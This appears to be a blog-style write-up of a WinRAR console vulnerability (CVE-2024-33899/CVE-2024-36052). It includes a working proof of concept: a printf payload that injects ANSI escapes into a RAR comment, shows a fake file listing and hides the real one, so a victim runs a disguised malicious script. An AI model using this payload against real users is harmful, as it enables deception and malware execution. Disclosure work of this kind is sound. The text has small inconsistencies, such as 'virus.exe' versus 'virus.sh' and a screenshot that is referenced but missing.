# CVE-2024-33899: ANSI Escape Injection Vulnerability in WinRAR

## Overview

On February 28, 2024, RARLAB released an update for WinRAR, addressing an ANSI escape sequence injection vulnerability identified in the console versions of RAR and UnRAR. This vulnerability, tracked as CVE-2024-33899 for Linux and Unix systems and CVE-2024-36052 for Windows systems, affects versions 6.24 and earlier. It allows attackers to spoof screen output or cause a denial of service on Linux and Unix. This issue was resolved in version 7.00. It is important to note that the GUI version of WinRAR and the UnRAR library were not impacted by this vulnerability.

## Understanding the Vulnerability

### ANSI Escape Sequences

Programs like Vim and Neofetch utilize ANSI escape sequences to modify text and background color, control the cursor, and create graphical user interfaces within the terminal. Although ANSI escape sequences can create advanced terminal programs, they can also be weaponized.

### How WinRAR is Affected

WinRAR provides console versions of RAR and UnRAR, which can be used to create and extract RAR archives. RAR files support comments, which are displayed when listing the contents of the archive using the command `rar l demo.rar`.

#### Vulnerability Demonstration

To check if ANSI escape sequences are filtered out in the comment section, we can use a simple payload that will display "THIS IS GREEN" in green text.

```bash
printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | rar c demo.rar
```
Upon executing ``rar l demo.rar``, the output shows "THIS IS GREEN" in green, indicating that the comment field does not filter ANSI escape sequences.

Exploitation
This vulnerability can be exploited in various ways. Here, we will demonstrate an exploit suited for WinRAR.

Creating the Exploit
First, we will place our virus.exe file inside a RAR archive:

```bash
$ ls myfolder
virus.sh
$ rar a demo.rar script.sh myfolder 
```

Next, we will add the following payload to the comment section:
```bash
printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r–        7    2024-05-19  16:26  notvirus.pdf\n-rw-r--r–      193    2024-05-19  16:26  script.sh\n----------- ---------  ---------- -----  ---------\n               200                          2\e[8m' | rar c demo.rar
```

This payload includes a fake listing where `virus.sh` is replaced with `notvirus.pdf`. The ANSI escape sequence `\e[8m` is used to hide all content after the comment section in the output. Consequently, the actual file listing is hidden, and our fake file listing is displayed.

The `script.sh` file inside `demo.rar` is designed to run all the .sh files inside myfolder so that the victim doesn't find anything suspicious when asked to run the `script.sh`, which would actually end up running the `virus.sh`. By running `script.sh`, all the shell scripts within myfolder will be executed in sequence. This is useful for batch processing tasks, ensuring that each script is run without having to execute them individually.

## Result
In the screenshot above, you can see a large gap between the output and the shell prompt. This gap is due to the original file listing being outputted but rendered invisible using \e[8m. While experienced command line users may find this suspicious, less experienced users could easily be tricked.


## Conclusion
The ANSI escape sequence injection vulnerability in the console versions of RAR and UnRAR posed a significant risk, allowing attackers to spoof output and potentially cause denial of service. This issue, identified as CVE-2024-33899 for Linux and Unix systems and CVE-2024-36052 for Windows, was addressed in WinRAR version 7.00. The GUI version of WinRAR and the UnRAR library remain unaffected by this issue.
